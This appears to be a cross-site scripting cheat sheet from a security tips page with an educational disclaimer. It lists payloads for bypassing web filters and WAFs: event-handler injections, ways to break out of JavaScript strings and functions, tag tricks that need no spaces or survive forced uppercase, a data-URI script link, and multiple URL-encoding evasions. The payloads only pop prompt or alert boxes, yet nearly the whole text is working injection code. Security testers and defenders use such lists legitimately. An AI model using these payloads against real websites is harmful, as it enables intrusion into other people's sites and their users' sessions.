Warning
==============

All the information provided on this site is for educational purposes only.

The site or the authors are not responsible for any misuse of the information.

You shall not misuse the information to gain unauthorized access and/or write malicious programs.

These information shall only be used to expand knowledge and not for causing malicious or damaging attacks.

Did you break out of a tag and script, iframe, img, a, &gt; etc are all blocked?
==============

Did they block onerror onload onclick? Try something like this:
```html
<XXXXXXX ondblclick=prompt(1)>Some Text, Don't even care to end the tag either.
```
If you just need to break out for Proof of Concept and can't use a > to close your tag, this will utilize the " in your injection.
```html
" onclick="prompt(1)
```
WAF got you down? There are a ton of bypasses, look at HTML5 for more ideas also (Just remember IE vs Firefox and HTML5 support.
```html
<body onpageshow="prompt(123)">
<details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>
<video onmouseenter=prompt(123)>
```

Don't forget the injection might not be a form tag but in the javascript.
==============
```html
";prompt(1);//

';prompt(1);//
```

What if they are in a function? Break out of it. Count the brackets, etc to kill the function.
```html
"};prompt(1);//
```
You may need to reconstruct the function
```html
"};prompt(1);function whatever(){//
```

Don't forget %0D%0A if you need a new line

Obscure Breakout
==============
```html
a'*prompt(123)*'
<script>
var a = 'a'*prompt(123)*'a';
var b = "a"*prompt(456)*"a";
</script>
```
```
http://yourtarget/whatever?a=<a &a= onclick=prompt(123) &a= >adsf
```
That would render potentially
```html
<a , onclick=prompt(123) , >asdf
```
Event Handlers You Should Investigate to bypass WAF
==============
https://www.w3.org/TR/html52/single-page.html

When you can't use spaces
==============
```html
<details/open/ontoggle=prompt(123)>
```
When the text is forced UPPERCASE
==============
```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```
Just for fun
==============
```html
<a/href="data:text/html;charset=utf-8,<script>alert(123)</script>">Just Interesting</a>
```
Internet Explorer can be your friend
==============
A lot of times you will notice that " or ' has become %22 or %27 in Chrome, Firefox, Opera etc. But did you try Internet Explorer. Many times you can get an Internet Explorer only XSS due to how the browser works.

Just a few things to remember
==============
```
%3c -- <
%3e -- >
%2b -- + (this is important for sql injection)
%26%2360; -- <
%26%2362; -- >
\u003C -- <
\x27 -- '
%26lt; or %26lt -- <
%26gt; or %26gt -- >
```
Double Encoding Example
```
%253c
```
Triple Encoding
```
%25253c
```
